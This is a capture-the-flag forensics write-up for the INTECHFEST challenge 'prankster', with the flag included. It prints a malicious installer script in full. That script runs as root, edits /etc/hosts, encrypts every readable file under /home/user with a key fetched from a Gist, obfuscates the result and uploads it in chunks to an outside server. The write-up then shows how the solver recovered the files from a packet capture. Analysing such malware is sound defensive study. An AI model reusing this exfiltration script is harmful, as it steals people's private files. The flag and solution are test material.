---
title: prankster
categories: Forensics
authors: musafir
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 371
solves: 7
flags: INTECHFEST{created_by_aiof_course_392adc02}
---

> Yesterday my friend (he is Chizuru's Fiancée) give me an installer and told me to run it, it seems suspicious but i trust him so much, so i did it without thinking twice about the installer.
>
> and yes, nothing happen, but my friend (he is Chizuru's Fiancée) suddenly know about a story I wrote in secret! HOW how did he know?!!
>
> mirror: https://mega.nz/file/0pQEwbBR#KFfkiS5ExyEoyXdTIyi5Fx6ny5D7ec2M8ftsNOhriqk password: notinfectedofc

---

```sh
[ "$(id -u)" -ne 0 ] && echo "[!] This script must be run as root!" \
    && exit 1 || echo "[+] Already running as root."

for pkg in openssl curl xxd; do
    if ! command -v "$pkg" >/dev/null 2>&1; then
        echo "[?] $pkg not found, installing..."
        if command -v apt >/dev/null 2>&1; then
            echo "[!] apt found"
            apt-get update && apt-get install -y "$pkg"
        elif command -v yum >/dev/null 2>&1; then
            echo "[!] yum  found"
            yum check-update || true
            yum install -y "$pkg" || yum install -y vim-common
        else
            echo "[!] Installer not found !!!"
        fi
    else
        echo "[+] $pkg is already installed"
    fi
done

IP="192.168.1.58"
HOST="trusted.backup.co.id"
echo '192.168.1.58 trusted.backup.co.id' >> /etc/hosts
SRC="/home/user"
URL="http://trusted.backup.co.id:5000/data"

find "$SRC" -type f -readable | while read -r F; do
    REL="$(realpath --relative-to="$SRC" "$F")"
    ENC="$(mktemp)"
    curl -o /tmp/init.txt.pem \
      https://gist.githubusercontent.com/blacowhait/c2564d1908bbea2dc1de62ca6ac24e67/raw/2e5c55fe1fb3ece8869120b1b6e415b16255f0a9/9f6b902bd7ac7ae385ac90089cbc665f88d7698a2d325c751163ed20946405a2.pem
    openssl enc -aes-256-cfb \
      -K "$(head -c 64 /tmp/init.txt.pem)" \
      -iv "$(tail -c 32 /tmp/init.txt.pem)" \
      -in "$F" | xxd -p | rev | xxd -r -p | tee "$ENC" > /dev/null
    split -b 250 -d -a 6 "$ENC" "/tmp/${REL//\//__}.enc."
    for C in /tmp/${REL//\//__}.enc.*; do
        echo "[*] Uploading $REL -> $(basename "$C")"
        curl -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "{\"data\":\"$(xxd -p "$C" | tr -d '\n' | rev )\",\
\"chunk\":\"$(basename "$C")\"}"
        rm -f "$C"
    done
    rm -f "$ENC"
done
```

- **Keying.** It fetches `/tmp/init.txt.pem` from a GitHub Gist. The **first 64 bytes** (hex) are used as `-K` (**AES-256 key**, i.e., 32 bytes) and the **last 32 bytes** (hex) as `-iv` (16 bytes). Mode is **AES-256-CFB**.
- **Obfuscation.** After encryption, it runs a pipeline:
  `… | xxd -p | rev | xxd -r -p`
  This is a subtle trick: `xxd -p` turns bytes into a hex string, `rev` reverses that entire string **character by character**, `xxd -r -p` packs the reversed hex back into bytes.
- **Chunking.** It splits the obfuscated ciphertext into **250-byte** chunks with deterministic filenames like `/tmp/path__to__file.enc.000000`, `.000001`, etc.
- **Exfil.** For each chunk, it posts JSON:
  `{"data":"<hex_of_chunk_reversed_again>","chunk":"<chunk_filename>"}`
  it **hexes** the chunk and `rev`s the hex string before embedding into JSON.

We don't get the server, but we do have a Sysdig **scap** capture. The upload requests contain the JSON bodies, so we carve those back out:

```sh
grep -aoE '\{"data":"[0-9A-Fa-f]+","chunk":"[^"]+"\}' challenge.scap > enc.json
```

The uploader's inner obfuscation step is exactly this:

```sh
xxd -p "$C" | tr -d '\n' | rev
```

It converts the 250-byte chunk back to hex, strips newlines, and reverses the entire hex string. That is precisely how `"data"` was produced before being placed inside JSON. In recovery we must **reverse it back** (i.e., apply `rev` again) before hex-decoding to get the true chunk bytes.

Reassembling the file from JSON chunks:

```py
import json

with open('enc.json', 'r', encoding='utf-8') as f:
    data = json.load(f)

for item in data:
    idx = int(item['chunk'].split('.')[-1])
    hex_r = item['data'][::-1]
    chunk_bytes = bytes.fromhex(hex_r)

    with open('0.txt.enc', 'ab') as out_file:
        out_file.write(chunk_bytes)
```

Finally, undo the inner obfuscation and decrypt:

```sh
curl -o /tmp/init.txt.pem \
      https://gist.githubusercontent.com/blacowhait/c2564d1908bbea2dc1de62ca6ac24e67/raw/2e5c55fe1fb3ece8869120b1b6e415b16255f0a9/9f6b902bd7ac7ae385ac90089cbc665f88d7698a2d325c751163ed20946405a2.pem
xxd -p 0.txt.enc | rev | xxd -r -p | openssl enc -d -aes-256-cfb -K "$(head -c 64 /tmp/init.txt.pem)" -iv "$(tail -c 32 /tmp/init.txt.pem)" -out 0.txt
```
